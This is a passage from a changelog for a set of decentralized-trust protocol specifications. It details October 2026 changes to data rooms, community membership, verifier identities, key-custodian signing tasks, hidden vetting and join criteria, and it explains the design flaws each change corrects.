  - vtc/rooms/community/{list,get} — the owner's view, with counts and when the
    community's own authority lapses.
  - vtc/rooms/community/members/{add,remove,list} — add has the VTA issue the
    invitation, membership and authority credentials (never admin) and keeps
    them as an offer; remove advances a sealed room's epoch through the owner's
    group removal and says what removal does not do (no recall; an authority
    credential is honoured until it expires, so open rooms want short expiries).
    members/list is paged and separate from get, because a community library
    can admit the whole community.

  Members, on their own DID (pull-shaped admission: a member's VTA has no
  inbound address):
  - vtc/rooms/offers/list — the caller's offers and the credentials to store with
    their own key holder; never anyone else's.
  - vtc/rooms/offers/accept — on a sealed tier, a KeyPackage in and the Welcome
    out, after the VTA adds the member. A repeat with the same KeyPackage gets the
    same Welcome; an unknown outcome is admissionPending, retried safely because
    the VTA settles a pending admission first.

  Only active members of the community are admitted to its rooms. Step-up and
  consent are described as the intended model, not declared (SPEC §7.3 item 13).
  The owner's record of whom it admitted lives apart from anything the host path
  reads, so invariant I5 and portability hold.

  New shared schema vtc/_shared/0.1/community-room.schema.json. Additive for the
  generated types: new modules only.



### Specifications

- **rooms,vtc**: Rooms/owner/group/remove, and a `rooms` topic on the console's live events (vtc/admin/events 0.2) (#767)

rooms/owner/group/remove/0.1 — the last of the owner's group tasks
  (data-rooms-files.md §11). Removal is an epoch advance and nothing else is:
  the key holder drops the member's leaf and advances the room at its host
  with the link and commit, under the caller's `admin` authority. Same
  remote-first rules as group/add as corrected in #766: the advanced state is
  kept durably before the host is contacted, applied only once the host
  accepts, discarded only on a refusal, kept on an unknown outcome and settled
  by the next request through rooms/info. At most one pending advance per room,
  admission or removal. Refuses `ownLeaf` (an owner leaving hands the room on
  with rooms/owner/transfer). States what removal does not do: no recall of
  what was read, and the authority credential is a separate thing.

  vtc/admin/events {_shared,subscribe,event} 0.2 — the topic set is closed per
  version ("a topic not listed here is a new MINOR version of this
  component"), so the `rooms` topic is a new version rather than an `ext`
  member. `rooms` prompts vtc/rooms/list, vtc/rooms/usage and
  vtc/storage/configs/list, goes to holders of vtc.rooms.admin, carries no
  count, and is hinted when a room is registered or removed or changes
  lifecycle state, when a room's usage or a storage config's held bytes
  crosses 80, 95 or 100 percent of a limit or capacity in either direction,
  and when a storage config is created, changed or changes state — naming
  none of them (data-rooms-files.md §6.3 alerts). subscribe 0.2 allows up to
  seven topics. 0.1 is unchanged; a community serving both answers each at its
  own version.

  Additive for the generated types: new modules; the TypeScript 0.1 modules
  keep exporting `Topic` (the generator now disambiguates the two shared
  definitions internally).

- **rooms**: Group/add keeps a pending admission on an unknown outcome; details schemas for group codes (#766)

Corrections to rooms/owner/group/{create,add}/0.1 (drafts, #763), found
  implementing them in the VTA:

  - add, item 5: discard the pending admission only on a refusal. An
    unreachable or silent host is an unknown outcome — it may have accepted —
    and discarding then would leave the owner an epoch behind their own room.
    The pending admission is kept for item 6; hostUnreachable's meaning says so
    instead of "nothing was changed".
  - add, items 2-3: what is kept is the advanced group state with the link,
    commit and Welcome, beside the group the recipient holds, since a
    committer cannot process its own commit later.
  - add, item 6: the host's epoch is read with rooms/info under the caller's
    read authority, from the host the admission was sent to; a host at neither
    epoch has moved on, so discard and refuse epochConflict.
  - detailsSchema for create's alreadyExists (epoch) and add's epochConflict
    (hostEpoch), which the text already promised.
  - create, item 1: the gates on naming the key are issue-membership's, but
    nothing is signed, so a signing quota is not consumed or consulted.

- **rooms**: Rooms/owner/group/{create,add} — the owner's agent founds and grows a sealed room's group; register signs as the owner (#763)

* spec(rooms): rooms/owner/group/{create,add} — the owner's agent founds and grows a sealed room's group; register signs as the owner

  A sealed room (`attributed`, `private`) cannot be written to until its MLS
  group exists, and every member reaches the group by a Welcome — except the
  owner, whom nobody can welcome. The member half is specified
  (`rooms/keys/{key-package,welcome,commit}`); the owner half was not, so no
  surface could found a sealed room or admit anyone to one.

  - `rooms/owner/group/create/0.1`: the owner's key holder forms the room's
    group with the owner as its only leaf, at room epoch 1 (the epoch a host
    records at registration). Entitlement: control of the room's signing key,
    as for issuing its credentials. Refuses `alreadyExists` rather than
    replacing a group whose key schedule sealed records depend on.
  - `rooms/owner/group/add/0.1`: the key holder admits a member's KeyPackage,
    advances the room at its host with `rooms/epoch/mint` (link and commit
    included, the caller's `admin` authority presented), and returns the
    Welcome for the caller to deliver with `rooms/keys/welcome` — never
    through the host. Remote first: the pending commit is kept durably, sent,
    and applied only once the host accepts, and reconciled against the host's
    epoch after a crash, since a key holder cannot process its own commit
    from the wire.
  - `rooms/owner/register/0.1` (draft, clarified in place): the key holder
    sends `rooms/create` with `ownerDid` as its issuer, signed with a key of
    that DID it holds, and never as itself; it refuses with `permissionDenied`
    before contacting the host when it holds none. `rooms/create` names the
    Owner as issuer, and a host running a creation policy (a community
    admitting rooms for its members) checks the party asking is the owner it
    names — a registration issued by the agent in another party's name is one
    no host can tell from registering rooms in a stranger's name. No schema
    change beyond the `ownerDid` description.

  Additive for the generated types: two new modules, no change to an
  existing type.

## 0.8.1 — 2026-10-14


### Added

- **vtc**: Verifier identities list — the OpenID4VP verifier's state for administrators (#761)

vtc/oid4vp/identities/list/0.1 lets a community's configuration
  administrator read the OpenID4VP verifier identities the community presents
  to swiyu and EUDI wallets, and what stops each from serving one.

  A verifier identity is installed out of band — a DID registered with an
  ecosystem, an access certificate from a registrar, trust statements from a
  registry — and each part expires on its own schedule. A wallet that refuses
  a request object tells the community nothing. Per identity the response
  gives the client identifier wallets see, the DID and signing method, where
  the key is held (cached, or kept by the community's agent), the access
  certificate's subject, issuer and validity, each verifier_info attestation
  with its expiry, whether it is the default, and whether a session could be
  opened on it now. Problems use a fixed vocabulary with error/warning
  severity: invalid key custody, no loaded signer, no link to the agent, a
  missing, not-yet-valid, expired or expiring certificate, a missing identity
  trust statement, an expired or expiring statement; and, community-wide, a
  default identity that is not installed, or no https public URL.

  The response never carries key material, nor the identifier under which the
  agent holds a key.

## 0.8.0 — 2026-10-13


### Specifications

- **vtc**: A vta-account storage config names the account's context as well as its identifier (#758)

`StorageAuth`'s `vta-account` variant named only `account`, but a VTA names an
  external account by the context that owns it and its identifier there: the
  `external/credentials/issue` task the community sends requires both. A
  community could only fill the gap from something outside the config, which
  makes a config mean something only on the host that stored it, confines every
  account a community uses to one context, and leaves each implementation to
  fill the gap its own way.

  `vta-account` now requires `context` (`ExternalAccountContextId`, the issue
  task's `AccountContextId` form), and `CredentialState` carries it beside
  `account`. Naming a context grants nothing: the VTA issues only to a consumer
  bound to the account and holding `external-auth-use` in that context.
  `vtc/storage/configs/create` item 5 addresses the account by that pair and
  never by an identifier resolved against a context of the community's own
  choosing; `unknownAccount` on create and update says so. A new invalid
  example covers a missing context.

  Breaking for the generated types: a new required member. No community could
  create a `vta-account` config before this (the one implementation refused
  every kind but `local`), so no stored config lacks it.

## 0.7.2 — 2026-10-13


### Added

- **vta/pcs**: The VTA as hidden-vetting (PCS) engine — applicant and vetter tasks (#756)

* feat(vta/pcs): the VTA as hidden-vetting (PCS) engine — applicant and vetter tasks

  A community that runs hidden vetting admits an applicant on a zero-knowledge
  proof that enough distinct eligible vetters vetted them. Every vetter and
  applicant holds a PCS secret key, and until now the member side ran only in a
  client that links the PCS library — so a wallet with no PCS implementation
  (a mobile app) could not take part at all.

  This adds the vta/pcs/* family: the VTA holds the PCS keys and runs every
  member-side operation; the client carries messages and never holds a key.

## 0.7.1 — 2026-10-12


### Added

- **provision/vta**: Add the VTA Farm claim and redeem tasks for the vta-claim trigger-link flow (#753)

* feat(provision/vta/claim): add the VTA Farm claim task for the vta-claim trigger-link flow

  The first request of the vta-claim flow (VTI-LNK-110 to 117): a wallet claims a reserved VTA from a Farm with a fresh Ed25519 did:key that becomes the VTA's administrator, and the Farm answers with the VTA DID, the operation and whether it holds the VTA for the claim check. Patterned on auth/oob/claim; bindings regenerated for Rust, TypeScript, Go and Dart.

## 0.7.0 — 2026-10-11


### Specifications

- **rooms**: Rooms/info and rooms/usage require a proof, like every other rooms/* task (#750)

Both said a proof was RECOMMENDED, on the reasoning that the room-issued chain
  is "bound to whoever the host authenticated". A room operation carries no
  session, so the only party a host can authenticate is the proof's signer. The
  chain's leaf must be that party. Without a proof there is nobody to bind it
  to, and the presentation becomes a bearer token. Every other rooms/* task
  already requires a proof for this reason. A host implementing the chain rule
  refuses an unsigned info or usage request anyway, so the RECOMMENDED was
  already unworkable.

  Breaking for a producer that sent these unsigned. Both specs are drafts.

## 0.6.2 — 2026-10-11


### Added

- **keys**: Sign-jws and sign-csr — protocol signatures from a VTA-held key (#749)

A custodian that hardens keys/sign frames every payload under its own
  opaque signing domain (vti.vta.opaque-signing.v1 || 0x00 || payload), so
  nothing signed there verifies as a protocol signature. That is the point
  of the hardening, and it also means nobody can obtain a usable JWS or a
  certificate request for a custodian-held key. A community server acting
  as an OpenID4VP verifier for swiyu and EUDI wallets needs both: a signed
  request object (typ oauth-authz-req+jwt) and proof-of-possession JWTs,
  and a PKCS#10 request to obtain an EUDI relying-party access certificate.

  Two narrow tasks where the custodian builds the protocol bytes itself, so
  the key stays custodian-held and the custodian signs only what it built:

  - keys/sign-jws/0.1: the producer sends header members and a payload
    (a JSON object, or payloadBase64Url); the custodian sets alg from the
    key type (EdDSA, ES256, ES256K, ML-DSA-44/65), refuses alg, crit, b64,
    jwk, jku and x5u, checks an x5c leaf against the key, serialises both
    halves with RFC 8785 and signs the bare JWS signing input. Audited by a
    digest of the signing input, never the payload.
  - keys/sign-csr/0.1: the producer names the subject as ordered typed
    attributes from a closed set and optional subject alternative names;
    the custodian builds the CertificationRequestInfo from those and the
    key's own public key (P-256 with ecdsa-with-SHA256, or Ed25519) and
    returns the PEM request with the key's multibase public key. No
    extension but subjectAltName is ever requested.

  Registers the signJws and signCsr device capabilities (sign-jws and
  sign-csr in 0.1). A custodian must not require sign for either; one that
  frames keys/sign under its own domain should not accept sign in their
  place, since its sign grant cannot yield a JWS or CSR.

  Bindings regenerated (Rust, TS, Go, Dart); no version bumps.

  Refs OpenVTC/verifiable-trust-infrastructure#1988



### Specifications

- **rooms**: Define the sealed record body, signed by its author and bound to its location (#747)

* spec(rooms): define the sealed record body, signed by its author and bound to its location

  records/put 0.2 already relied on "the sealed body the author signed" to
  detect a substituted blob, and blobs.schema.json defined the body's `file`
  member, but nothing defined the body itself. Without it, two clients cannot
  read each other's records, and nobody can check the signature.

  SealedRecordBody (rooms/_shared/0.1/room.schema.json) is the JSON inside
  SealedRecord.ciphertext on attributed and private rooms:

  - the open tier's title, description, body and tags;
  - an optional `file` (FileManifest);
  - `author`;
  - a Data Integrity proof by `author` (eddsa-jcs-2022, or ecdsa-jcs-2019 for
    a hardware-backed signer).

  Readers MUST verify the proof and MUST refuse a record that fails it, not show
  it with a warning.

  The body also signs its own location (roomId, key, version). The AEAD binds
  those against the host, but any member can open and re-seal a record. Without
  the signed location, a member could copy another member's body to a new key
  or version, and on a private room, where the host records no author, readers
  would attribute it to the original author. On attributed rooms, readers also
  check `author` against the author the host recorded.

  records/put 0.2 and keys/seal 0.1 point at the definition. keys/seal says a
  key holder seals what it is given and never signs for the writer. No payload
  or response schema changes, so no version moves and no generated type changes.

## 0.6.1 — 2026-10-11


### Added

- **vtc**: Wallet presentation sessions for a join — start and status (#745)

A VTC is becoming an OpenID4VP 1.0 verifier so that a swiyu or EUDI wallet
  can present an SD-JWT VC as evidence for a community join. Such a wallet has
  no DID agent: it cannot sign a Trust Task or receive a pushed document, and
  speaks only OpenID4VP over HTTPS.

  vtc/join-requests/wallet-session/start/0.1 lets the applicant, who does sign
  Trust Tasks, begin that exchange on the wallet's behalf. It opens a
  short-lived session bound to the proof signer, to one criterion version
  (named by the manifest's requirementsDigest, as submit/0.3 names it) and
  optionally to an existing join request, and returns the wallet invocation
  URI, the prefixed client_id the key-binding JWT will name, and the
  criterion's published DCQL query unchanged. The wallet-facing request_uri
  (signed JAR, RFC 9101) and response_uri (direct_post.jwt) are OpenID4VP's
  wire and outside the task.

  vtc/join-requests/wallet-session/status/0.1 lets the applicant read the
  outcome: the session state, and once presented, whether the query was
  satisfied, the holder key and which credentials were presented — never
  claim values — or, when refused, why. Only the applicant who began the
  session can read it.

  The wallet's presentation becomes evidence on the applicant's join, never
  the applicant's identity: the holder key is recorded beside the applicant
  DID, not instead of it.

  Companion specification change: trustoverip/dtgwg-vti-spec#60
  (foreign-protocol interfaces, VTI-OPS-095–099; VTI-CRD-024/025).
  Tracking: OpenVTC/verifiable-trust-infrastructure#1988.

## 0.6.0 — 2026-10-11


### Specifications

- **rooms**: An unauthorized room request is refused with the standard permissionDenied (#743)

Thirteen rooms specifications (create, epoch/{commits,mint,prune},
  keys/open, keys/present 0.1 and 0.2, owner/{claim,transfer},
  records/{curate,get,list,put} 0.1) declared a task-specific
  `<slug>:notAuthorized` for a failure the framework already names: an
  authorization refusal is the standard `permissionDenied` (SPEC §7.2, §8.3).
  The extended code shadowed it, so a consumer switching on
  `permissionDenied` never matched it, and a party that did not recognise it
  degraded it to `taskFailed` (§8.5), a worse signal than the code it
  duplicated. The later rooms specifications (records/put 0.2 onward) already
  use the standard code, as the reference room host does for every version.

  Each withdrawn declaration's condition is kept as one sentence at the end of
  the specification's Conformance section, naming `permissionDenied`. Same
  correction as `vta/app-state:permissionDenied` in 0.11.3.

  Breaking for trust-tasks-rs: the thirteen `error_codes::NOT_AUTHORIZED`
  constants are removed from the generated rooms modules. A consumer emitting
  one should emit `StandardCode::PermissionDenied` instead.

## 0.5.9 — 2026-10-10


### Added

- **external**: VTA external accounts — management, credential issuance and Sui signing (#740)

* feat(external): VTA external accounts — management, credential issuance and Sui signing

  Adds the external/* family: external/accounts/{list,get,create,update,secret/set,bindings/grant,bindings/revoke,setup,probe,keys/rotate,suspend,resume,archive,restore,delete}/0.1, external/credentials/issue/0.1 and external/sign/0.1, with shared shapes and family conventions in external/_shared/0.1.

  A key custodian holds an identity at a third party and never releases its key or secret. Integrations bound to the account get short-lived credentials the custodian obtained and downscoped itself, sealed to the caller, or signatures over Sui transactions the custodian decoded and checked against an allow-list. Every model pins the custodian's verification material at the provider, so none needs the custodian to be reachable from the internet; plain OIDC discovery federation is excluded for that reason.

- **rooms**: Files in data rooms, and VTC room storage administration (#739)

* spec(rooms): shared file and blob types

- **auth/oob**: Add the auth/oob out-of-band sign-in Trust Task family (#738)

* feat(auth/oob): add the auth/oob out-of-band sign-in family

  Eight Trust Task specifications for out-of-band sign-in started by a
  trigger link: request, claim, prove, identify, respond, grant, redeem
  and cancel, with a shared auth/oob/_shared/0.1 component (closed
  purpose and mode lists, handle, key, number, origin, requester), the
  family conventions, and the binding note defining the sign-in trigger
  link (VTI-LNK) in place of the trusttasks://oob scheme.

## 0.5.8 — 2026-10-05


### Specifications

- **vtc/vetting**: A drip tick is a time window, and publish refuses a changed signer or a second criterion (#734)

* spec(vtc/vetting): a drip tick is a time window, and publish refuses a changed signer or a second criterion

  Three holes in hidden vetting's community half, all draft edits in place
  (SPEC §5.2):

  - pcs-tokens/0.1: `tick` was the vetter's own schedule counter, so "once per
    tick" bounded nothing — a vetter could draw tick 1, 2, 3 … in the same
    minute, and the drip, whose purpose is the velocity cap, was unbounded.
    A tick is now a window: tick `t` (t ≥ 0) of a label is
    [start + t·tickLength, start + (t+1)·tickLength), where a label starts at
    00:00:00Z on the first day of its month (`token/<YYYY-MM>`) or on the
    event's `startDate` (`token/event/<id>`). A tick that has not begun is
    refused with the new `pcs-tokens:tickNotYet` (retryable); a begun, unserved
    tick stays drawable once (catch-up), so a member draws at most dripPerTick
    × ticks begun. Zero-based because the schema's `minimum` is 0, which keeps
    the generated `tick: u64` unchanged.
  - hidden/publish/0.1:
    - `tickLength` (ISO 8601 days/hours, at least PT1H, default P3D) in the
      payload, and required in `stored` and `published`; a configuration stored
      before it existed reads as P3D.
    - `signerChanged`: stored keys that differ from what the current signer
      derives are refused rather than silently replaced (every enrolled vetter's
      credential would stop verifying). Re-keying is the explicit
      withdraw-then-publish, under a new period.
    - `otherCriterion`: hidden vetting runs on at most one criterion, because
      enrolment, the drip and the challenge are served from one configuration.
  - hidden/show/0.1: `stored` and `published` carry `tickLength`.

  Bindings regenerated (Rust, TS, Go, Dart).

## 0.5.7 — 2026-10-05


### Added

- **keys/sign-sshsig**: SSHSIG signing without exporting the key (#732)

* feat(keys/sign-sshsig): SSHSIG signing without exporting the key

  git's SSH commit signing (gpg.format = ssh) calls a gpg.ssh.program to
  produce an SSHSIG signature. A producer whose key lives with a custodian
  today has to take the key out with keys/export-secret to do that, and
  keys/sign cannot stand in: since the opaque-signing hardening a custodian
  frames caller bytes under its own domain tag, so the signature never
  verifies as SSHSIG — which is the point of that hardening.

  keys/sign-sshsig/0.1 takes a digest, a namespace and a hash algorithm.
  The custodian builds the PROTOCOL.sshsig signed data itself and signs
  that, so every signature begins with the SSHSIG magic and is usable as
  nothing else. The message never travels; the key never leaves. EdDSA and
  ES256 only — the key types SSHSIG defines a signature for.

  Registers the signSshsig device capability (sign-sshsig in 0.1) beside
  sign: a custodian must not require the general oracle for this task, and
  may restrict namespaces and rate.

  Bindings regenerated (Rust, TS, Go, Dart); no version bumps.

## 0.5.6 — 2026-10-05


### Added

- **vtc**: Hidden vetting can be read and withdrawn, and an event approver names themselves (#729)

Hidden-vetter admission had an on switch (vtc/vetting/hidden/publish/0.1)
  and no way to turn it off or to see what was in force.

  - vtc/vetting/hidden/withdraw/0.1: an administrator removes one criterion's
    hidden-vetting parameters and republishes its manifest entry without them.
    The criterion's named vetting is untouched. Idempotent: a criterion with
    none answers withdrawn: false, not an error. Enrolment rows and the
    spent-token ledger are not deleted, and republishing later derives the
    same keys.
  - vtc/vetting/hidden/show/0.1: an administrator reads the stored
    configuration (events' approvedBy and graceDays included, which the
    manifest omits), the published configuration, the current digest, and
    counts only: enrolled vetters per live class label, and per event its
    groupSize against groupFloor with derived approved/live. The community
    MUST NOT disclose which members enrolled or asked. This is the companion
    read publish/0.1 anticipated: because publish replaces events wholesale,
    re-publishing from the manifest un-approves live events.
  - vtc/vetting/hidden/publish/0.1 (draft, edited in place): an approvedBy
    that is new or changed must name the publishing signer's principal
    (approverNotSigner); an unchanged stored value may be re-sent by any
    administrator so a re-publish keeps approvals; an approver who asked to
    vet at the event is refused (approverInEvent). Publish and withdraw
    SHOULD be audited with who, which criterion and the deltas, never a
    reason.

  Rust, TypeScript, Go and Dart bindings regenerated.

## 0.5.5 — 2026-10-03


### Added

- **git-ns**: Job/list 0.2 lists closePullRequest jobs (#727)

git-ns/bridge/job/0.5 added the closePullRequest kind, but job/list 0.1's
  JobKind is a closed response enum of the seven 0.4 kinds, so a VTC could not
  list those jobs to a strict consumer. 0.2 adds closePullRequest to JobKind and
  an optional row member `number` (the pull request closed; requires `repo`).
  The request is unchanged. Regenerated Rust, TS, Go and Dart bindings.

## 0.5.4 — 2026-10-03


### Documentation

- **git-ns**: Single-administrator mode may waive the self-grant rule (#725)

Fixed rule 7 of git-ns/right/grant 0.3 named break-glass as the one way
  an actor records an elevated right for themselves. In a community run by
  one person there is nobody to make those grants or to ratify a
  break-glass, so the rule left its administrator unable to own what they
  create or adopt, or to reseat a namespace to themselves.

  Add a narrowly scoped exception in git-ns/right/grant 0.3 (new section
  "The single-administrator waiver"): a VTC its host operator has
  configured for single-administrator operation (a host-level setting
  outside community policy; VTI-APV-022 in the VTI specification) MAY
  waive rule 7 for one operation when no other party is eligible to make
  the grant. When it does it MUST require an operation-bound step-up,
  MUST record a highest-severity audit event before the record (refusing
  if it cannot), and MUST mark the record and the response (payload ext);
  the record counts toward the last-owner and last-admin invariants. With
  any other eligible party the rule applies unchanged.

  repo/create 0.3, namespace/reseat 0.3 and drift/resolve 0.3 refer to
  the waiver where they apply rule 7. Prose only, in place on draft specs
  (SPEC 5.2); no schema change, since every affected response already
  carries the open ext member.

## 0.5.3 — 2026-10-03


### Added

- **git-ns**: Bridge event 0.4 pullRequestOpened and job 0.5 closePullRequest (#723)

A VTC community can restrict who may open pull requests on its governed
  repositories. The bridge reports each pull request opened or reopened
  (git-ns/bridge/event 0.4, new pullRequestOpened variant); when the VTC's
  pull-request policy does not allow the author, it sends the bridge a
  closePullRequest job (git-ns/bridge/job 0.5), which posts the community's
  message as a comment and closes the pull request, idempotently.

  Owners, maintainers and the bridge are always allowed; a reopen by an
  owner or maintainer is an override. The gate is hygiene, not the merge
  gate: the required commit-trust check remains the security control.

  Regenerated Rust, TypeScript, Go and Dart bindings.

## 0.5.2 — 2026-10-03


### Added

- **vtc**: Live admin console events — a hint-only subscription (#721)

Adds vtc/admin/events/subscribe/0.1 and vtc/admin/events/event/0.1, and
  the HTTPS binding 0.3 that carries them.

  A console opens one live channel per session with a signed subscribe
  naming the topics it renders (actions, acknowledgements, joinRequests,
  members, singleAdminMode, config). The community answers with the
  #response as the first document on a stream, then sends event documents
  that are hints only: a topic, a time, a resume token, and for the badge
  topics the caller's count. A hint MUST NOT carry record data, record
  identifiers or personal data; the console re-fetches through the
  existing signed reads, so authorization stays on every read and the
  stream can neither leak a record nor grant a read. Each topic is sent
  only to a caller who could perform its read, checked per hint; a
  shrinking topic set ends the stream rather than silently narrowing it.
  Resumption is in-band (`since`), an unknown token is never an error,
  and the console must show live/offline from a signal that can go false
  (heartbeat interval in the response). Polling stays the fallback.

  HTTPS binding 0.2 said it defined no streaming variant, so 0.3 adds
  §2.1 streamed responses: Accept: text/event-stream on the ordinary
  POST; refusals stay JSON and never open a stream; the #response is the
  first SSE event; one complete document per single data: line, no
  event: field; SSE id carries the task's resume token; heartbeats are
  SSE comments; resumption is in-band only, with Last-Event-ID a
  cross-check (mismatch is malformedRequest); either side may close, a
  close is not cancellation, no error is sent after the #response, and a
  stream ends no later than the bearer credential that opened it. Native
  EventSource reconnection (a bodiless GET) is deliberately not offered:
  every (re)connection is a freshly signed request. Registered in
  website/assets/bindings.js. No framework change was needed.

## 0.5.1 — 2026-10-03


### Added

- **vtc**: Cooling-off actions, a reduction-pending notice and an offline-write record type (#719)

Three gaps the VTC implementation (OpenVTC/verifiable-trust-infrastructure#1920)
  found in the vtc/admin/actions family.

  vtc/admin/actions/_shared/0.2 adds the cooling-off action. A removal of an
  administrator with no third party to consent is parked for a cooling-off
  period and lands by itself unless its requester cancels. 0.1 could only say
  that by omitting threshold and expiresAt against its own prose and carrying
  the landing time in ext. 0.2 adds category coolingOff, landsAt (when it lands),
  cancellableBy (requester), closedReason landedAfterCoolingOff, and callerRole
  subject, so the administrator being removed can see the action. list, show,
  cancel and acknowledge 0.2 re-point at _shared 0.2; their request payloads
  and error codes are unchanged.

  vtc/members/authority-reduction-pending-notice/0.1 tells the subject that a
  reduction is cooling off, before it lands. The subject cannot block it,
  because a veto held by the subject would protect a compromised subject. One-way,
  proof REQUIRED.

  vtc/operator/offline-write/0.1 is a record type, never sent. An acknowledge
  action for an operator's offline write (vtc admin emergency-bootstrap and its
  siblings) names it as typeUri and carries the record as payload. Before, there
  was no Type URI to name, because those commands are not Trust Tasks.
  sideEffects none. It follows the registry's existing never-sent-on-its-own
  documents (auth/step-up/approver/attest, auth/signing-key/authorize).

## 0.5.0 — 2026-10-03


### Specifications

- **git-ns**: Activity/list 0.1 declares the `source` its ActivityItem requires (#718)

`$defs/ActivityItem` listed `source` in `required` but defined no `source`
  property, under `additionalProperties: false`. No item could validate, so no
  non-empty `git-ns/activity/list/0.1#response` could either: a consumer that
  validates rejected every conforming response. The `Source` enum (`audit` |
  `job`) was defined in `$defs` but never referenced. The spec prose, its
  examples and the one implementation (the VTC) all carry `source`; only the
  schema lost it. The property now references `#/$defs/Source`.

  The spec is a draft and the change makes the schema accept the wire its prose
  and implementation already use, so it is edited in place (SPEC §5.2).

  The registry's unsatisfiable-schema lint (added after
  `provision/integration/0.3`, #326) checked only the root and
  `$defs.Response`, so an item definition reached through `Response.items`
  went unseen. It now walks every subschema closed by
  `additionalProperties: false`; against main it reports exactly this defect
  and nothing else.

  Breaking for Rust: the generated `ActivityItem.source` was an untyped
  `serde_json::Value` (the codegen's fallback for a required member with no
  schema) and is now the generated `Source` enum. Go and Dart gain a typed
  `source` field; TypeScript gains it on the interface and the embedded schema.

  Reported by the VTA browser plugin's schema-satisfiability test against
  @openvtc/trust-tasks 0.22.7.

## 0.4.7 — 2026-10-02


### Added

- **vtc**: Administrator action list, approver-device step-up, and role-based authority (#714)

* feat(vtc): administrator action list, approver-device step-up, and role-based authority

  Wire shapes for role-based administration at a community, the N-of-M
  approval action list, and an approver device as a re-authentication factor.
  Requirements: trustoverip/dtgwg-vti-spec#51 (VTI-APV-016 - 021,
  VTI-ACL-035 - 037, VTI-VTC-022 - 023). Design:
  OpenVTC/verifiable-trust-infrastructure docs/05-design-notes/
  vtc-{action-list,approver-step-up,admin-roles}.md.

  Action list (new family vtc/admin/actions):
  - _shared/0.1 Action (category approval|acknowledge|queue, status, threshold,
    approvals, summary rendered from the digested payload via JSON Pointers,
    templateDigest, per-approver challenge).
  - list/0.1 (views waitingForMe|requestedByMe|history|all, counts for the
    console badge), show/0.1, cancel/0.1, acknowledge/0.1.
  - A parked operation is answered with the existing trust-task-next-step/0.1
    (continuation proceed, expects vtc/admin/actions/show/0.1).
  - task-consent/decision/0.2: optional evidence (webauthn | approverSigned)
    and actionId; the document proof stays the approver's own.

  Approver step-up (new family auth/step-up/approver):
  - attest/0.1, the approver's signed statement (purpose stepUp|decision|enrol),
    carried embedded.
  - invite/0.1, redeem/start/0.1, redeem/finish/0.1, enroll/0.1 (self-service
    from an existing factor, subject's own signature), list/0.1, revoke/0.1,
    _shared/0.1 Approver.
  - auth/step-up/approve-request/0.4 (accepts, approvers) and
    approve-response/0.6 (approverSigned evidence).
  - vtc/install/claim/{start,finish}/0.3: claim under an existing DID with an
    approver instead of a passkey.

  Roles and capabilities:
  - acl/_shared/0.2 AclEntry with explicit act, keys and capabilities
    (VTI-ACL-006 - 008, -020), optional approve and approveCapabilities,
    resource-qualified capability grants (VTI-ACL-035), delegatedBy.
  - acl/{grant,update,show,list,revoke,change-role}/0.2 on AclEntry 0.2.
  - New family vtc/roles: _shared/0.1 RoleDefinition (a role is a ceiling),
    define/0.1, list/0.1, show/0.1, delete/0.1.

  All four bindings regenerated (Rust, TS, Go, Dart); check-bindings agrees.

## 0.4.6 — 2026-10-02


### Added

- **auth/signing-key**: Enroll 0.2 — the identity's own authorization, and key replacement (#712)

auth/signing-key/enroll/0.2 adds two optional members to 0.1:

  - authorization: a complete auth/signing-key/authorize/0.1 document (new),
    issued and signed by identityDid, addressed to the consumer, whose payload
    is the enrolment's payload with authorization removed. A valid one is the
    authority evidence of control over identityDid in place of an
    operation-bound step-up. For a holder who signs in with a key its agent
    holds (a VTA wallet persona) and has no passkey at the consumer, it is the
    only evidence available, and it is the stronger of the two.
  - replaces: an active delegation of the same identity revoked in the same
    critical section as the enrolment. At the consumer's cap a holder whose
    other keys live on browsers it no longer has could neither list nor revoke
    them — both need a working key — and so could not enrol at all.

  tooManyKeys gains details.activeKeys, listed only once the enrolment's
  authority evidence has been accepted. New codes: authorizationInvalid,
  replaceNotFound (one answer for every reason). The cap is decided after the
  evidence and standing, counting a replaced key as gone. Producers SHOULD mint
  a new key per enrolment: an expired delegation still answers
  alreadyEnrolled.

  authorization is an open object in the enroll schema on purpose: its proof
  covers every member, so a binding must not narrow it to a typed struct that
  drops one before verification.

## 0.4.5 — 2026-10-02


### Added

- **vtc/join-requests**: A criterion states its admission, so any join policy is expressible (Keyring VTI-13) (#710)

* feat(vtc/join-requests): a criterion states its admission, so any join policy is expressible (Keyring VTI-13)

  A community's join criteria could not express its join policy. A criterion
  was a DCQL query (presentation-definition) with optional vetting, so it could
  not say:
  - that nothing is required: DCQL asks for at least one credential, so an
    open community had to delete every criterion;
  - that a submission meeting it is reviewed rather than admitted;
  - that an invitation is required, outside `vetting`;
  - whose credentials count.
  And submit decided against an unseen "active join policy", so an applicant
  could not tell an automatic path from a queue.

  A criterion is now one way into the community: what it requires and how a
  submission meeting it is decided.
  - vtc/_shared/0.2 schema-registry: AcceptsCriterion gains `admission`
    (REQUIRED: automatic | review), `credentialIssuers` (community | recognised
    | any, with `query`) and `invitationRequired`. `query` becomes OPTIONAL.
  - vtc/schemas/accepts/register, show, list 0.2: adopt it.
    register/0.2 adds `unsupportedRequirement`.
  - vtc/join-requests/manifest/0.3: `admission`, `credentialIssuers` and
    `invitationRequired` on Criterion; `presentationDefinition` OPTIONAL;
    `requirementsDigest` REQUIRED on every criterion. Criteria are listed in the
    order the community decides by. An empty list means no applications are
    accepted.
  - vtc/join-requests/submit/0.3: `criterion` names the criterion by digest. A
    submission naming none is decided under the first criterion it meets.
    Deciding is stated normatively. Not meeting a criterion never admits;
    `review` refers and never admits by itself; `automatic` admits unless the
    community refuses or refers on recorded grounds outside its criteria.
    Nothing outside a criterion admits anyone. New codes `criterionUnknown` and
    `notAccepting`.

  The specifications state no default criterion and prefer none. Open
  admission, review only (where invitations and trusted credentials admit no
  one), invitation only, credential-gated, vetted, and any combination or set
  of alternatives are expressed the same way, and each community's
  administrators choose. Earlier versions are unchanged.

  Bindings regenerated (Rust, TS, Go, Dart).



### Specifications

- **vtc/join-requests/status**: An approved applicant can ask for its credentials again (#709)

* spec(vtc/join-requests/status): an approved applicant can ask for its credentials again

  An approved join is not finished until the membership credential reaches the
  applicant, and nothing in the family could say it had not, or ask for it again.
  In the field a persona was approved, listed as a member, and stayed Pending in
  its client: the credential push was lost, and a poll answering `approved` sent
  nothing.

  status/0.1 (draft, in place):
  - request `resendCredentials`: ask for the already-issued credentials again.
  - response `credentialsDelivered` (on `approved`): whether the community holds
    the applicant's acknowledgement.
  - response `credentialResend` (`queued` | `notNeeded` | `rateLimited`) and
    `retryAfter`. Absent after the flag means the consumer does not support it.
